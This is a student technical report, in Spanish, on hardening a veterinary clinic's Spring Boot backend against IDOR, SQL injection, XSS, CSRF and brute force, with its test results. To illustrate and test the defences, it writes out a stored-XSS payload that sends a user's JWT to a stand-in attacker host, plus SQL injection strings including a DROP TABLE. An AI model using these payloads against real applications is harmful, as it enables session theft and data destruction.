---
title: "Informe técnico Semana 3 - Integrando seguridad en aplicaciones Backend"
curso: "Desarrollo Backend II (PBY2202)"
proyecto: "Clínica PetSalud"
grupo: "Mónica Figueroa, Gabriela Goycochea, Jorge Guillén"
rama: "semana3-seguridad"
fecha: 2026-11-06
---

# Informe técnico: seguridad del backend de Clínica PetSalud

> [!NOTE]
> Borrador del informe para el formato de respuesta (forma B). Sigue los pasos 1 a 3 del formato y la estructura que mostró el profesor en el reforzamiento. Cada control remite a la clase que lo implementa y a la prueba que lo demuestra. Las evidencias están en `docs/semana3/evidencias/`.

**Punto de partida.** Se usó como base el backend de Clínica PetSalud entregado en el AVA, continuando la implementación de seguridad de la Semana 2 (JWT, BCrypt, roles, control de propiedad y bloqueo por intentos fallidos). Esta entrega agrega `@PreAuthorize` en todos los endpoints, validación de entradas, protección y pruebas contra SQL Injection, XSS y CSRF, y un monitoreo básico de actividad sospechosa.

---

## 1. Análisis del caso

### 1.1 Revisión de los requerimientos del cliente

Clínica PetSalud atiende en cuatro sucursales (Región Metropolitana y Región de Valparaíso) y su backend maneja citas, expedientes médicos, inventario, ventas, fidelización y notificaciones. El cliente pide:

- **Autenticación segura** con JWT, en un entorno sin estado (stateless).
- **Autorización por roles**: clientes, empleados y gerentes, cada uno con acceso solo a lo que le corresponde.
- **Privacidad** de los datos personales de los clientes y de los datos clínicos de sus mascotas.
- **Cumplimiento** de la normativa chilena de protección de datos personales.

Activos que hay que proteger:

| Activo | Dónde está | Por qué importa |
| --- | --- | --- |
| Credenciales | Tabla `usuarios`, columna `password` (hash BCrypt) | Con ellas se suplanta a cualquier usuario |
| Datos personales | Tabla `usuarios`: email, teléfono, dirección | Protegidos por la Ley 19.628 |
| Datos clínicos | Tabla `expedientes_medicos`: descripción, diagnóstico, tratamiento | Información de salud, la más delicada del sistema |
| Compras y puntos | Tablas `ventas` y `recompensas` | Revelan hábitos de consumo de cada cliente |
| Catálogo e inventario | Tabla `productos` | Su integridad afecta precios y stock de las sucursales |
| Clave de firma JWT | Variable de entorno `JWT_SECRET` | Quien la tenga puede fabricar tokens de cualquier rol |

### 1.2 Análisis de amenazas

#### Acceso no autorizado a datos sensibles

- **Cambio de identificador (IDOR).** Un cliente autenticado consulta `GET /api/mascotas/1`, luego prueba con 2, 3, 4... o pide `GET /api/ventas/usuario/7` con el id de otra persona. Si el servicio solo validara que el token es válido, vería mascotas y compras ajenas.
- **Rol insuficiente.** Un cliente llama a `GET /api/usuarios` (lista de todos los usuarios) o a `POST /api/notificaciones/usuario/{id}` (envío de promociones), o un veterinario elimina un registro clínico con `DELETE /api/expedientes/{id}`.
- **Asignación masiva (hallazgo propio).** Hasta la Semana 2, `POST /api/mascotas/propietario/{id}` recibía la entidad JPA completa. Un cuerpo con `"id": 1` hacía que JPA actualizara la mascota 1, aunque perteneciera a otra persona. Lo mismo ocurría con productos, expedientes, notificaciones y recompensas.
- **Fuerza bruta.** Miles de intentos contra `POST /api/auth/login` con una lista de contraseñas. Además de adivinar claves, puede saturar el servicio (denegación de servicio).

**Impacto:** pérdida de confidencialidad de datos personales y clínicos, modificación indebida de registros (integridad), posibles sanciones por la normativa de datos personales y daño a la confianza de los clientes.

#### Inyección SQL

Los puntos donde un dato del usuario llega a una consulta son el login (email), el registro, la búsqueda por categoría `GET /api/productos/categoria?categoria=`, los ids de las rutas y los cuerpos de POST y PUT.

Ejemplo: si el login armara la consulta concatenando texto, como `"SELECT * FROM usuarios WHERE email = '" + email + "'"`, el valor `' OR '1'='1' --` la convertiría en una condición siempre verdadera y devolvería el primer usuario de la tabla (normalmente el administrador). Con `'; DROP TABLE usuarios; --` se podrían borrar tablas.

**Impacto:** afecta las tres propiedades: confidencialidad (lectura de toda la base), integridad (modificación de datos) y disponibilidad (eliminación de tablas).

**Situación en PetSalud:** los 8 repositorios usan consultas derivadas de Spring Data JPA (`findByEmail`, `findByCategoria`, `findByMascotaId`...), sin `@Query` ni SQL nativo. Hibernate las ejecuta con `PreparedStatement` y parámetros enlazados, así que el valor nunca se mezcla con la estructura de la consulta. El riesgo que queda es que en el futuro alguien agregue una consulta concatenada; por eso se suma validación de entrada y una prueba que falla si aparece SQL nativo.

#### Cross-Site Scripting (XSS)

Afecta a los campos de texto que después se muestran en una interfaz: nombre de la mascota, motivo de la cita, descripción, diagnóstico y tratamiento del expediente, mensaje de las notificaciones, descripciones de productos y recompensas, y dirección del usuario.

Ejemplo (XSS almacenado): un cliente registra una mascota con el nombre `<script>fetch('https://atacante.example/?t=' + localStorage.token)</script>`. Cuando un veterinario abre la ficha en el front, el script se ejecuta en su navegador y envía su JWT al atacante, que con ese token puede leer los expedientes de todos los pacientes.

**Impacto:** robo de sesión del personal, acceso a datos clínicos y acciones en nombre de la víctima. La API responde JSON y no HTML, pero no puede confiar en que todos los front muestren los datos de forma segura.

#### Cross-Site Request Forgery (CSRF)

CSRF necesita que el navegador adjunte la credencial por su cuenta. Si PetSalud usara una sesión con cookie (`JSESSIONID`), un sitio malicioso podría hacer que el navegador del gerente, con la sesión abierta, enviara `DELETE /api/productos/5` sin que se diera cuenta.

**Cómo viaja la credencial en PetSalud:**

1. El front envía email y contraseña por HTTPS a `POST /api/auth/login`.
2. La API responde un JWT en el cuerpo, sin cookies ni sesión (`SessionCreationPolicy.STATELESS`).
3. El front guarda el token en memoria o en `sessionStorage`, que se borra al cerrar la pestaña. `localStorage` también funciona, pero un XSS podría leerlo; por eso los controles contra XSS son parte de la defensa contra robo de token.
4. En cada solicitud, el front agrega el header `Authorization: Bearer <token>`.

El navegador nunca agrega ese header por su cuenta y otro sitio no puede leer el token, así que un formulario o una imagen de un sitio malicioso llega sin credencial y recibe 401. Que la API sea stateless no basta por sí solo; lo que la protege es que la credencial no viaja en una cookie. Por eso se desactiva el token CSRF de Spring y se agrega CORS restringido. Si en el futuro el token se guardara en una cookie, habría que reactivar CSRF o usar cookies `SameSite=Strict`.

### 1.3 Requerimientos de seguridad

| Código | Requerimiento | Cómo se cumple |
| --- | --- | --- |
| RS-01 | Autenticar con email y contraseña, guardando las contraseñas con BCrypt y entregando un JWT firmado (HS256) de 30 minutos, con emisor y audiencia | `AuthController`, `UsuarioServiceImpl`, `JwtUtil` |
| RS-02 | Atender cada solicitud sin sesión: los recursos protegidos exigen `Authorization: Bearer` | `SecurityConfig` (STATELESS), `JwtRequestFilter` |
| RS-03 | Declarar la regla de acceso de cada endpoint por ruta y por método | `SecurityConfig`, `@PreAuthorize` con `ReglasAcceso` |
| RS-04 | Un cliente solo puede ver y modificar sus propios datos, aunque cambie los ids de la solicitud | `AutorizacionService` en los servicios |
| RS-05 | Validar forma, largo y caracteres de toda entrada en el backend, sin depender del front | DTO con `@Valid` y `Validaciones` |
| RS-06 | Acceder a la base solo con consultas parametrizadas, sin SQL concatenado ni nativo | Repositorios Spring Data JPA |
| RS-07 | No exponer contraseñas, tokens ni detalles internos en respuestas, errores o registros | `@JsonProperty(WRITE_ONLY)`, `server.error.include-*=never`, `JWT_SECRET` por variable de entorno |
| RS-08 | Rechazar con 401 (sin identidad) o 403 (sin permiso) sin revelar información privada | `SecurityConfig` |
| RS-09 | Limitar la fuerza bruta: bloqueo de 5 minutos tras 5 fallos y detección de ráfagas por IP | `LoginAttemptService`, `ActividadSospechosaService` |
| RS-10 | Registrar intentos fallidos, accesos rechazados, entradas rechazadas y operaciones de escritura con fecha, hora, IP, usuario y operación, en un archivo | `ActividadSospechosaService`, `AuditoriaRequestFilter`, `logging.file.name` |
| RS-11 | Enviar cabeceras contra XSS y permitir llamadas de navegador solo desde los front autorizados | `SecurityConfig` (CSP y CORS) |

### 1.4 Usuarios y roles

El caso pide clientes, empleados y gerentes. En el código se llaman `CLIENTE`, `VETERINARIO` y `ADMIN`; se mantuvieron esos nombres para no romper los datos ni las pruebas existentes.

- **Visitante (sin rol en la base de datos):** cualquier persona sin iniciar sesión. Puede ver el catálogo, registrarse e iniciar sesión.
- **Cliente (`CLIENTE`):** registra y administra sus mascotas, agenda y cancela sus citas, y consulta sus ventas, notificaciones y puntos. No puede ver datos de otros clientes, expedientes médicos, la lista de usuarios ni administrar el catálogo.
- **Empleado (`VETERINARIO`):** consulta las mascotas de los clientes para atenderlas, registra expedientes **a su propio nombre**, consulta expedientes, cambia el estado de **sus** citas asignadas y revisa el stock bajo. No elimina expedientes, no administra usuarios, productos, recompensas ni notificaciones, y no ve las compras de los clientes.
- **Gerente (`ADMIN`):** administra usuarios, catálogo, recompensas y notificaciones, ve todas las ventas y las citas por rango de fechas, y es el único que puede eliminar registros clínicos.

Matriz de roles, acciones y endpoints ("propias" significa que el servicio comprueba que el recurso pertenece al usuario autenticado):

| Recurso o acción | Endpoint | Visitante | Cliente | Empleado | Gerente |
| --- | --- | --- | --- | --- | --- |
| Ver catálogo | `GET /api/productos`, `/{id}`, `/categoria` | Sí | Sí | Sí | Sí |
| Ver stock bajo | `GET /api/productos/stock-bajo` | No | No | Sí | Sí |
| Crear, editar o eliminar productos | `POST`, `PUT`, `DELETE /api/productos` | No | No | No | Sí |
| Registrarse e iniciar sesión | `POST /api/usuarios/registro`, `POST /api/auth/login` | Sí | Sí | Sí | Sí |
| Administrar usuarios | `/api/usuarios/**` | No | No | No | Sí |
| Registrar y consultar mascotas | `/api/mascotas/**` | No | Propias | Sí | Sí |
| Modificar o eliminar mascotas | `PUT`, `DELETE /api/mascotas/{id}` | No | Propias | Propias | Sí |
| Agendar o cancelar citas | `POST /api/citas`, `DELETE /api/citas/{id}` | No | Propias | Propias | Sí |
| Consultar citas | `GET /api/citas/{id}`, `/mascota/{id}` | No | Propias | Asignadas | Sí |
| Citas de un veterinario | `GET /api/citas/veterinario/{id}` | No | No | Propias | Sí |
| Cambiar estado de una cita | `PUT /api/citas/{id}/estado` | No | No | Asignadas | Sí |
| Citas por rango de fechas | `GET /api/citas/entre-fechas` | No | No | No | Sí |
| Registrar expedientes | `POST /api/expedientes` | No | No | A su nombre | Sí |
| Consultar expedientes | `GET /api/expedientes/**` | No | No | Sí | Sí |
| Eliminar expedientes | `DELETE /api/expedientes/{id}` | No | No | No | Sí |
| Registrar una venta | `POST /api/ventas` | No | Propias | Sí | Sí |
| Ver ventas | `GET /api/ventas/{id}`, `/usuario/{id}` | No | Propias | Propias | Sí |
| Ver todas las ventas | `GET /api/ventas` | No | No | No | Sí |
| Enviar notificaciones | `POST /api/notificaciones/usuario/{id}` | No | No | No | Sí |
| Leer y gestionar notificaciones | `/api/notificaciones/**` | No | Propias | Propias | Sí |
| Asignar o eliminar puntos | `POST`, `DELETE /api/recompensas` | No | No | No | Sí |
| Consultar puntos | `GET /api/recompensas/**` | No | Propios | Sí | Sí |

### 1.5 Estrategias de autenticación y selección

| Estrategia | Cómo funcionaría en PetSalud | Evaluación |
| --- | --- | --- |
| Usuarios en memoria (`InMemoryUserDetailsManager`) | Cuentas fijas definidas en el código | Sirve solo para pruebas rápidas: no permite que los clientes se registren ni administrar cuentas. Descartada |
| Usuario y contraseña en base de datos | `UsuarioDetailsService` lee la cuenta de MySQL, `DaoAuthenticationProvider` compara la clave con `BCryptPasswordEncoder` | Permite registro, roles y administración de cuentas propias. Es la fuente de identidades del sistema |
| LDAP o LDAPS | Spring Security valida las credenciales contra un directorio corporativo (puerto 636 con TLS en el caso de LDAPS) | Útil para el personal si la clínica tuviera un directorio (Active Directory, OpenLDAP). No sirve para clientes externos y el caso no menciona un directorio. Se deja como mejora futura para empleados y gerentes |
| IDaaS con OpenID Connect (Okta, Auth0, Microsoft Entra ID) | Un proveedor en la nube autentica y entrega tokens con SSO y MFA | Muy útil cuando hay muchas aplicaciones internas, pero agrega costo, dependencia de un tercero y transferencia de datos personales fuera de la clínica. Excede lo que pide el caso |
| JWT | Tras verificar las credenciales, la API emite un token firmado que el cliente envía en cada solicitud | No guarda sesión en el servidor, así que escala a varias sucursales e instancias. Exige proteger la clave, fijar la vigencia y aceptar que un token sigue válido hasta vencer |

**Estrategia seleccionada: JWT combinado con usuarios en base de datos.** JWT no reemplaza la verificación de credenciales: para emitir un token primero hay que autenticar. El flujo queda así:

1. El usuario envía email y contraseña a `POST /api/auth/login`.
2. Spring Security busca la cuenta con `UsuarioDetailsService` y compara la contraseña con el hash BCrypt guardado (se compara el hash, nunca se descifra).
3. Si es correcta, `JwtUtil` emite un JWT firmado con HS256 que incluye emisor (`PetSalud`), audiencia (`petsalud-api`), usuario, rol, fecha de emisión y vencimiento (30 minutos).
4. En cada solicitud, `JwtRequestFilter` verifica la firma, el vencimiento, el emisor y la audiencia, carga el usuario desde la base (así un cambio de rol se aplica de inmediato) y deja la identidad en el `SecurityContext`.
5. Las reglas por ruta, `@PreAuthorize` y `AutorizacionService` deciden si la operación se permite.

Se eligió por los requerimientos del cliente (JWT y stateless) y porque no depende de una sesión compartida entre las sucursales. Sus debilidades se mitigan con vigencia corta, clave en variable de entorno y validación de emisor y audiencia.

### 1.6 Protección de datos personales en Chile

- **Ley 19.628** (vigente): regula el tratamiento de datos personales. Exige usarlos solo para la finalidad con que se recolectaron y resguardarlos con cuidado.
- **Ley 21.719** (publicada el 13 de diciembre de 2024): reforma la Ley 19.628 y crea la Agencia de Protección de Datos Personales. Clasifica los datos de salud como **datos sensibles**, exige medidas técnicas y organizativas de seguridad, y amplía los derechos de los titulares (acceso, rectificación, supresión, oposición y portabilidad). Su entrada en vigencia está fijada para el 1 de diciembre de 2026. El 28 de octubre de 2026 el Senado aprobó postergarla al 15 de octubre de 2027, y el proyecto pasó a la Cámara de Diputados; conviene revisar su estado al momento de entregar.

Medidas del backend relacionadas:

| Medida | Relación con la normativa |
| --- | --- |
| Acceso a expedientes solo para personal, y eliminación solo para el gerente | Datos de salud: acceso restringido a quien los necesita |
| Cada cliente ve solo sus datos (`AutorizacionService`) | Confidencialidad y finalidad |
| Contraseñas con BCrypt y nunca en las respuestas | Medidas técnicas de seguridad |
| Errores sin detalles internos | Minimizar la información expuesta |
| Registro de accesos rechazados y operaciones, sin datos personales innecesarios ni credenciales | Trazabilidad para detectar y responder ante incidentes |
| Clave JWT fuera del código | Gestión segura de secretos |

---

## 2. Guía de configuración paso a paso

> [!TIP]
> Los pasos 1 a 6 vienen de la Semana 2 y se resumen. Los pasos 7 a 11 son de esta semana.

1. **Dependencias** (`pom.xml`): `spring-boot-starter-security`, `spring-boot-starter-web`, `spring-boot-starter-validation`, `jjwt-api`, `jjwt-impl` y `jjwt-jackson` 0.12.6. Para las pruebas: `spring-security-test` y `h2` (solo pruebas de repositorio).
2. **Propiedades** (`application.properties`): conexión a MySQL con `DB_USERNAME` y `DB_PASSWORD`, `jwt.secret=${JWT_SECRET}` (Base64, mínimo 32 bytes), `jwt.expiration-ms=1800000`, `jwt.issuer=PetSalud`, `jwt.audience=petsalud-api`, `login.max-attempts=5`, `login.lock-minutes=5`, `server.error.include-stacktrace=never` y `server.error.include-message=never`.
3. **Usuarios desde la base:** `UsuarioDetailsService` implementa `UserDetailsService` y busca por email; `UsuarioDetails` entrega el rol como autoridad.
4. **Contraseñas:** bean `BCryptPasswordEncoder`. `UsuarioServiceImpl` cifra la clave al registrar y fija el rol en `CLIENTE` (nadie se registra como ADMIN).
5. **JWT:** `JwtUtil` genera y valida el token (firma HS256, emisor, audiencia y vencimiento). `AuthController` expone `POST /api/auth/login`.
6. **Filtro:** `JwtRequestFilter` (`OncePerRequestFilter`) lee `Authorization: Bearer`, valida el token y autentica la solicitud. Se agrega con `addFilterBefore(..., UsernamePasswordAuthenticationFilter.class)`.
7. **Cadena de seguridad** (`SecurityConfig`): sesión `STATELESS`, HTTP Basic y formulario desactivados, CSRF desactivado con su justificación, reglas por ruta, respuestas 401 y 403 con registro en el log, cabeceras CSP y Referrer-Policy, y CORS para los orígenes de `cors.allowed-origins`.
8. **Autorización por método:** `@EnableMethodSecurity` en `SecurityConfig` y `@PreAuthorize(ReglasAcceso.X)` en los 43 endpoints. `ReglasAcceso` define cuatro reglas: `PUBLICO`, `AUTENTICADO`, `PERSONAL` y `GERENTE`. Ejemplo:

   ```java
   @PreAuthorize(ReglasAcceso.GERENTE)
   @PostMapping("/usuario/{usuarioId}")
   public ResponseEntity<Notificacion> enviarNotificacion(@PathVariable Long usuarioId,
                                                          @Valid @RequestBody NotificacionRequest datos) {
   ```

9. **Validación de entradas:** un DTO por cada endpoint que recibe datos (`MascotaRequest`, `ExpedienteRequest`, `ProductoRequest`, etc.) con `@NotBlank`, `@Size` y `@Pattern`. Los patrones están en `Validaciones`: el texto libre no acepta `<` ni `>`, y los nombres no aceptan comillas, apóstrofes ni signo igual. Los parámetros `motivo`, `estado` y `categoria` se validan con las mismas anotaciones. `GlobalExceptionHandler` responde 400 con los campos rechazados.
10. **Monitoreo:** `ActividadSospechosaService` escribe en el logger `SEGURIDAD`. `AuditoriaRequestFilter` cuenta las solicitudes por IP y registra las escrituras exitosas. `logging.file.name=logs/petsalud.log` deja los eventos también en un archivo.
11. **Ejecución en IntelliJ IDEA:** abrir el proyecto, configurar las variables `DB_USERNAME`, `DB_PASSWORD` y `JWT_SECRET` en **Run > Edit Configurations**, ejecutar con el perfil `prueba` y correr las pruebas con clic derecho en `src/test/java` > **Run 'All Tests'**.

---

## 3. Explicación técnica: cómo cada configuración protege el backend

| Amenaza | Control implementado | Dónde está | Prueba que lo demuestra |
| --- | --- | --- | --- |
| Acceso sin identidad | Sesión STATELESS, filtro JWT y regla `anyRequest().authenticated()` | `SecurityConfig`, `JwtRequestFilter` | `SecurityConfigHttpTest`, `PreAuthorizeTest.sinTokenNoPuedeEnviarNotificaciones` |
| Token alterado, vencido o ajeno | Firma HS256 y validación de vencimiento, emisor y audiencia | `JwtUtil` | `JwtUtilTest` (10 casos), `JwtRequestFilterTest` |
| Rol insuficiente | Reglas por ruta más `@PreAuthorize` en cada método (defensa en profundidad) | `SecurityConfig`, `ReglasAcceso`, controladores | `PreAuthorizeTest` (incluye la verificación de que los 43 endpoints tienen regla) |
| IDOR (datos ajenos) | Comprobación de propiedad en los servicios | `AutorizacionService` | `AutorizacionServiceTest`, `*ServiceImplSecurityTest` |
| Asignación masiva | Los DTO no traen `id`, `rol`, `propietario` ni otras relaciones | Paquete `dto` | `AmenazasComunesTest.datosValidosSeAceptanSinIdNiPropietarioDelCuerpo` |
| SQL Injection | Validación de entrada y consultas parametrizadas de JPA, sin SQL nativo | `Validaciones`, repositorios | `AmenazasComunesTest.InyeccionSql` (4 casos) e `InyeccionSqlRepositorioTest` (7 casos contra H2) |
| XSS almacenado | Texto libre sin `<` ni `>`, más cabeceras CSP, `nosniff` y `X-Frame-Options` | DTO, `SecurityConfig` | `AmenazasComunesTest.CrossSiteScripting` (5 casos) |
| CSRF | Credencial solo en el header Authorization, sin cookies ni sesión, y CORS restringido | `SecurityConfig` | `AmenazasComunesTest.Csrf` (4 casos) |
| Fuerza bruta | Bloqueo de 5 minutos tras 5 fallos y alerta de ráfaga por IP | `LoginAttemptService`, `ActividadSospechosaService` | `AuthLockoutTest`, `LoginAttemptServiceTest`, `ActividadSospechosaServiceTest` |
| Actividad sin trazabilidad | Registro de eventos con fecha, hora, IP, usuario y operación, sin credenciales y a prueba de saltos de línea | `ActividadSospechosaService`, `AuditoriaRequestFilter` | `MonitoreoSeguridadTest`, `ActividadSospechosaServiceTest` |
| Fuga de información en errores | Respuestas uniformes, sin stack trace ni mensajes internos | `GlobalExceptionHandler`, propiedades `server.error.*` | Respuestas 400 de `AmenazasComunesTest` |

### Eventos que registra el monitoreo

| Evento | Cuándo ocurre |
| --- | --- |
| `LOGIN_OK` | Login correcto |
| `LOGIN_FALLIDO` | Credenciales incorrectas; incluye cuántos fallos seguidos lleva el usuario |
| `CUENTA_BLOQUEADA` | Quinto fallo seguido (posible fuerza bruta) |
| `LOGIN_RECHAZADO_BLOQUEO` | Intento de login mientras la cuenta está bloqueada |
| `JWT_INVALIDO` | Token alterado, vencido, de otro emisor o audiencia, o de un usuario inexistente |
| `SIN_AUTENTICACION` | Recurso protegido sin token válido (401) |
| `ACCESO_DENEGADO` | Usuario sin permiso por rol o por propiedad (403) |
| `ENTRADA_RECHAZADA` | Datos que no pasan la validación; solo se registran los nombres de los campos |
| `OPERACION` | POST, PUT o DELETE exitoso: quién creó, modificó o eliminó |
| `RAFAGA_SOLICITUDES` | Más de 200 solicitudes desde una IP en 15 minutos |

En un entorno real, el archivo `logs/petsalud.log` lo revisaría un sistema de detección (IDS/IPS o SIEM) para alertar, por ejemplo, ante muchos `LOGIN_FALLIDO` desde una misma IP.

---

## 4. Resultados de las pruebas

### 4.1 Pruebas automáticas

`mvn test` con MySQL disponible: **95 pruebas, 0 fallas, 0 errores**, `BUILD SUCCESS` (detalle en `evidencias/pruebas-automaticas.txt`). Respecto de la Semana 2 se agregaron 40 pruebas:

| Clase | Pruebas | Qué demuestra |
| --- | --- | --- |
| `PreAuthorizeTest` | 8 | Todos los endpoints tienen `@PreAuthorize` y los roles incorrectos reciben 403 antes de llegar al servicio |
| `AmenazasComunesTest` | 13 | SQL Injection, XSS y CSRF rechazados en la capa HTTP |
| `InyeccionSqlRepositorioTest` | 7 | Las cargas de inyección no devuelven datos ni alteran tablas en una base real (H2) |
| `MonitoreoSeguridadTest` | 6 | Cada evento queda en el log con IP, sin contraseñas ni tokens |
| `ActividadSospechosaServiceTest` | 4 | Detección de ráfagas, ventana de tiempo y protección contra falsificación de líneas del log |
| `JwtUtilTest` y `JwtRequestFilterTest` | 2 nuevas | Audiencia del token y registro de tokens inválidos |

### 4.2 Pruebas manuales contra la API

API levantada con el perfil `prueba` y base de datos real. Resultado completo en `evidencias/pruebas-manuales.txt`. La colección `postman/PetSalud_Semana3_Amenazas.postman_collection.json` repite estas pruebas en Postman: ejecutada completa con el Collection Runner (newman), sus 19 solicitudes y 22 verificaciones pasaron (`evidencias/postman-newman.txt`).

| Prueba | Esperado | Obtenido |
| --- | --- | --- |
| Login con `' OR '1'='1' --` como email y clave | 401 | 401, "Credenciales invalidas" |
| Registro con `cliente@petsalud.cl' OR '1'='1` | 400 | 400, campos: email |
| Búsqueda `categoria=Alimentos' OR '1'='1' --` | 400 | 400, campos: categoria |
| `GET /api/mascotas/1 OR 1=1` | 400 | 400, campos: id |
| Mascota con nombre `<script>alert('xss')</script>` | 400 | 400, campos: nombre |
| Diagnóstico `<img src=x onerror=alert(1)>` | 400 | 400, campos: diagnostico |
| Motivo de cita `<script>alert(1)</script>` | 400 | 400, campos: motivo |
| Expediente con datos válidos | 200 | 200 |
| Otro cliente envía `"id"` de la mascota Luna en el cuerpo | Se crea una mascota nueva | Se creó con otro id; Luna sigue intacta y con su dueño |
| `POST /api/productos` con cookie de sesión y sin Bearer | 401 | 401 |
| `Set-Cookie` en la respuesta del login | No existe | No existe |
| Preflight CORS desde `https://sitio-malicioso.example` | 403 | 403, "Invalid CORS request" |
| Preflight CORS desde `http://localhost:3000` | 200 | 200 |
| Cliente envía una notificación | 403 | 403 |
| Veterinario elimina un expediente | 403 | 403 |
| Gerente elimina un expediente | 204 | 204 |
| JWT con la firma alterada | 401 | 401 |
| Sexto login tras 5 fallos (clave correcta) | 429 | 429 |

Extracto del log de seguridad generado por esas pruebas (`evidencias/log-seguridad.txt`):

```text
WARN LOGIN_FALLIDO usuario=' or '1'='1' -- ip=127.0.0.1 fallosSeguidos=1
WARN ENTRADA_RECHAZADA usuario=cliente@petsalud.cl ip=127.0.0.1 POST /api/mascotas/propietario/3 campos=nombre
WARN ENTRADA_RECHAZADA usuario=vet@petsalud.cl ip=127.0.0.1 POST /api/expedientes campos=diagnostico
WARN ACCESO_DENEGADO usuario=cliente@petsalud.cl ip=127.0.0.1 POST /api/notificaciones/usuario/3
WARN ACCESO_DENEGADO usuario=vet@petsalud.cl ip=127.0.0.1 DELETE /api/expedientes/1
INFO OPERACION usuario=admin@petsalud.cl ip=127.0.0.1 DELETE /api/expedientes/1 status=204
WARN JWT_INVALIDO ip=127.0.0.1 GET /api/productos/stock-bajo motivo=SignatureException
WARN CUENTA_BLOQUEADA usuario=otro.cliente@petsalud.cl ip=127.0.0.1 minutos=5 motivo=posible_fuerza_bruta
WARN RAFAGA_SOLICITUDES ip=127.0.0.1 solicitudes=201 ventanaMinutos=15
```

Ninguna línea del log contiene contraseñas ni tokens.

---

## 5. Respuestas a las preguntas de apoyo

- **¿Cuáles son las principales amenazas y cómo impactan al negocio?** Acceso no autorizado (incluido IDOR y asignación masiva), SQL Injection, XSS, CSRF y fuerza bruta. Exponen datos personales y clínicos, permiten alterar registros e inventario y pueden detener el servicio, con riesgo legal y de reputación (sección 1.2).
- **¿Qué estrategias son más apropiadas?** Defensa en capas: autenticación con JWT, autorización por ruta, por método y por propiedad, validación de entradas, consultas parametrizadas, cabeceras de seguridad, CORS restringido y monitoreo.
- **¿Qué framework se adapta mejor y por qué?** Spring Security, porque se integra con Spring Boot, ofrece la cadena de filtros para JWT, BCrypt, `@PreAuthorize`, cabeceras y CORS, y se prueba con `spring-security-test`.
- **¿Cómo se implementó la autenticación y autorización por roles?** Login con base de datos y BCrypt que emite un JWT; filtro que lo valida en cada solicitud; reglas por ruta, `@PreAuthorize` en los 43 endpoints y verificación de propiedad en los servicios (secciones 1.5 y 2).
- **¿Qué medidas apoyan la Ley de Protección de Datos Personales?** Acceso mínimo a datos de salud, aislamiento de datos por cliente, contraseñas con BCrypt, errores sin detalles internos, trazabilidad de accesos sin datos innecesarios y clave fuera del código (sección 1.6).

## 6. Conclusiones y mejoras futuras

El backend cumple los requerimientos de autenticación stateless con JWT, autorización por roles en todos los endpoints y protección frente a las amenazas del caso, y cada control está respaldado por pruebas automáticas y manuales.

Quedan como mejoras, fuera del alcance de esta entrega:

- **HTTPS obligatorio** con HSTS en el despliegue: las credenciales solo deben viajar cifradas.
- **Revocación y renovación de tokens:** hoy un JWT sigue válido hasta vencer. Un token de refresco y una vigencia de 15 a 20 minutos reducirían el riesgo si se roba.
- **Bloqueo y monitoreo compartidos:** hoy viven en memoria. Con varias instancias convendría Redis o una base de datos, y enviar el log a un SIEM.
- **Sanitización con jsoup** si algún campo debiera aceptar HTML con formato.
- **DTO de salida** para entregar solo los campos necesarios en cada respuesta.
- **LDAPS o IDaaS** para el personal si la clínica incorpora un directorio corporativo o necesita SSO y MFA.

## 7. Referencias

- Spring Security Reference Documentation. https://docs.spring.io/spring-security/reference/index.html
- Spring Security, Method Security (`@PreAuthorize`). https://docs.spring.io/spring-security/reference/servlet/authorization/method-security.html
- Spring Security, CSRF: cuándo usar protección CSRF. https://docs.spring.io/spring-security/reference/features/exploits/csrf.html
- OWASP Top 10 (2021): A01 Broken Access Control y A03 Injection. https://owasp.org/Top10/
- OWASP Cheat Sheet Series: SQL Injection Prevention, Cross Site Scripting Prevention y Cross-Site Request Forgery Prevention. https://cheatsheetseries.owasp.org/
- Ley 21.719, que regula la protección y el tratamiento de los datos personales y crea la Agencia de Protección de Datos Personales. Biblioteca del Congreso Nacional. https://www.bcn.cl/leychile/navegar?idNorma=1209272
- Pauta.cl (29 de octubre de 2026). Senado aprueba prórroga de Ley de Protección de Datos Personales hasta octubre de 2027. https://www.pauta.cl/actualidad/2026/10/29/senado-aprueba-prorroga-de-ley-de-datos-personales-entrada-en-vigencia-se-posterga-hasta-octubre-de-2027.html
